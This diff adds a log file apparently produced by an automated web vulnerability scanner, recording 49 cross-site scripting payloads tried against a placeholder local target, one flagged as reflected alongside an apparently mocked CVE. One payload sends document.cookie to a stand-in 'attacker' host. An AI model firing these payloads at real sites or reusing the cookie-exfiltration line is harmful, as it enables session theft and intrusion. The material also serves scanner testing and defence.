@@ -1,0 +1,130 @@
+=== Web Security Scan Report ===
+Target: http://example.local/?q=1
+Start Time: Fri Oct 17 22:37:04 2025
+
+[~] Starting scan on target: http://example.local/?q=1
+[~] Output file: E:\hack\result\example.local.txt
+[~] Found parameters: q
+
+[~] Testing parameter 'q'
+[~] Phase: XSS (testing 49 payloads) on 'q'
+[XSS] (1/49) Testing payload on q: </title><svg/onload=confirm(1)>
+[++] Vulnerable webpage: http://example.local/?q=1
+[++] Parameter: q
+[++] Vector: </title><svg/onload=confirm(1)>
+    Evidence: <html><body>reflected:</title><svg/onload=confirm(1)><p>CVE-2025-12345</p><p>Base Score: 9.8</p></body></html>
+    CVEs found: CVE-2025-12345
+    CVSS: 9.8  Severity: Critical
+[XSS] (2/49) Testing payload on q: <script>confirm(1)</script>
+[XSS] (2) No reflection detected.
+[XSS] (3/49) Testing payload on q: "/><img src=x onerror=alert(1)>
+[XSS] (3) No reflection detected.
+[XSS] (4/49) Testing payload on q: <svg><script>alert(1)</script>
+[XSS] (4) No reflection detected.
+[XSS] (5/49) Testing payload on q: <body onload=alert('xss')>
+[XSS] (5) No reflection detected.
+[XSS] (6/49) Testing payload on q: </tItLE><a/+/onPoINTEReNter%0a=%0aconfirm()%0dx//v3dm0s
+[XSS] (6) No reflection detected.
+[XSS] (7/49) Testing payload on q: <A%250donMOuseOvER%250a%3D%250aa%3Dprompt%2Ca()%250dx%2F%2Fv3dm0s<img src=1 onerror=confirm('xss')>
+[XSS] (7) No reflection detected.
+[XSS] (8/49) Testing payload on q: <iframe src="javascript:confirm(1)"></iframe>
+[XSS] (8) No reflection detected.
+[XSS] (9/49) Testing payload on q: <svg onload=alert`1`>
+[XSS] (9) No reflection detected.
+[XSS] (10/49) Testing payload on q: '"><svg/onload=alert(1)>
+[XSS] (10) No reflection detected.
+[XSS] (11/49) Testing payload on q: "><script>new Image().src='//attacker/?c='+document.cookie</script>
+[XSS] (11) No reflection detected.
+[XSS] (12/49) Testing payload on q: <input autofocus onfocus=alert(1)>
+[XSS] (12) No reflection detected.
+[XSS] (13/49) Testing payload on q: <details open ontoggle=alert(1)>Open</details>
+[XSS] (13) No reflection detected.
+[XSS] (14/49) Testing payload on q: <meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+[XSS] (14) No reflection detected.
+[XSS] (15/49) Testing payload on q: <object data="javascript:alert(1)"></object>
+[XSS] (15) No reflection detected.
+[XSS] (16/49) Testing payload on q: <svg/onload=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>
+[XSS] (16) No reflection detected.
+[XSS] (17/49) Testing payload on q: <img src=x onerror=javascript:confirm%281%29>
+[XSS] (17) No reflection detected.
+[XSS] (18/49) Testing payload on q: <img src="x" onerror="/*
+*/alert(1)">
+[XSS] (18) No reflection detected.
+[XSS] (19/49) Testing payload on q: <video><source onerror=alert(1)></video>
+[XSS] (19) No reflection detected.
+[XSS] (20/49) Testing payload on q: <math><mi onmouseover=alert(1)>X</mi></math>
+[XSS] (20) No reflection detected.
+[XSS] (21/49) Testing payload on q: ' onmouseover=alert(1) x='
+[XSS] (21) No reflection detected.
+[XSS] (22/49) Testing payload on q: "><svg><g onload=alert(1)></g></svg>
+[XSS] (22) No reflection detected.
+[XSS] (23/49) Testing payload on q: </textarea><script>alert('xss')</script>
+[XSS] (23) No reflection detected.
+[XSS] (24/49) Testing payload on q: <a href="javascript:/*
+*/alert(1)">click</a>
+[XSS] (24) No reflection detected.
+[XSS] (25/49) Testing payload on q: <a href='javas&#99;ript:alert(1)'>x</a>
+[XSS] (25) No reflection detected.
+[XSS] (26/49) Testing payload on q: <svg><foreignObject><body onload=confirm(1)></body></foreignObject></svg>
+[XSS] (26) No reflection detected.
+[XSS] (27/49) Testing payload on q: <form action=javascript:alert(1)><input type=submit></form>
+[XSS] (27) No reflection detected.
+[XSS] (28/49) Testing payload on q: <img src=x onerror=eval('con'+'firm(1)')>
+[XSS] (28) No reflection detected.
+[XSS] (29/49) Testing payload on q: <script>setTimeout(()=>alert(1),0)</script>
+[XSS] (29) No reflection detected.
+[XSS] (30/49) Testing payload on q: %22%3e%3c%2f%64%69%76%3e%3c%68%31%3e%6b%65%64%6a%61%77%33%6e%3c%2f%68%31%3e
+[XSS] (30) No reflection detected.
+[XSS] (31/49) Testing payload on q: <input type="text" value="<script>alert('XSS')</script>">
+[XSS] (31) No reflection detected.
+[XSS] (32/49) Testing payload on q: <textarea><script>alert('XSS')</script></textarea>
+[XSS] (32) No reflection detected.
+[XSS] (33/49) Testing payload on q: <form><button formaction="javascript:alert('XSS')">Click me</button></form>
+[XSS] (33) No reflection detected.
+[XSS] (34/49) Testing payload on q: <form><input type="hidden" name="xss" value="<script>alert('XSS')</script>"></form>
+[XSS] (34) No reflection detected.
+[XSS] (35/49) Testing payload on q: <input type="text" onfocus="alert('XSS')" value="Focus me">
+[XSS] (35) No reflection detected.
+[XSS] (36/49) Testing payload on q: <input type="button" value="Click me" onclick="alert('XSS')">
+[XSS] (36) No reflection detected.
+[XSS] (37/49) Testing payload on q: <form action="https://example.com/post" method="POST"><input type="text" value="<script>alert('XSS')</script>"></form>
+[XSS] (37) No reflection detected.
+[XSS] (38/49) Testing payload on q: <input type="text" value='"><script>alert(1)</script>'>
+[XSS] (38) No reflection detected.
+[XSS] (39/49) Testing payload on q: <input type="text" value='"><img src=x onerror=alert(1)>'>
+[XSS] (39) No reflection detected.
+[XSS] (40/49) Testing payload on q: <form><input name="xss" value="<img src=x onerror=alert('XSS')>"></form><input type="text" value="<script>alert('XSS')</script>">
+[XSS] (40) No reflection detected.
+[XSS] (41/49) Testing payload on q: <textarea><script>alert('XSS')</script></textarea>
+[XSS] (41) No reflection detected.
+[XSS] (42/49) Testing payload on q: <form><button formaction="javascript:alert('XSS')">Click me</button></form>
+[XSS] (42) No reflection detected.
+[XSS] (43/49) Testing payload on q: <form><input type="hidden" name="xss" value="<script>alert('XSS')</script>"></form>
+[XSS] (43) No reflection detected.
+[XSS] (44/49) Testing payload on q: <input type="text" onfocus="alert('XSS')" value="Focus me">
+[XSS] (44) No reflection detected.
+[XSS] (45/49) Testing payload on q: <input type="button" value="Click me" onclick="alert('XSS')">
+[XSS] (45) No reflection detected.
+[XSS] (46/49) Testing payload on q: <form action="https://example.com/post" method="POST"><input type="text" value="<script>alert('XSS')</script>"></form>
+[XSS] (46) No reflection detected.
+[XSS] (47/49) Testing payload on q: <input type="text" value='"><script>alert(1)</script>'>
+[XSS] (47) No reflection detected.
+[XSS] (48/49) Testing payload on q: <input type="text" value='"><img src=x onerror=alert(1)>'>
+[XSS] (48) No reflection detected.
+[XSS] (49/49) Testing payload on q: <form><input name="xss" value="<img src=x onerror=alert('XSS')>"></form>
+[XSS] (49) No reflection detected.
+[~] XSS indicators found for 'q', skipping SQLi phase for this parameter.
+
+====== SCAN STATISTICS ======
+Target: http://example.local/?q=1
+Total parameters tested: 1
+XSS findings: 1
+SQLi indicators: 0
+Duration (s): 0.09
+Scan finished: Fri Oct 17 22:37:04 2025
+
+Discovered CVEs:
+  - CVE-2025-12345
+
+Severity summary (heuristic):
+  Critical: 1
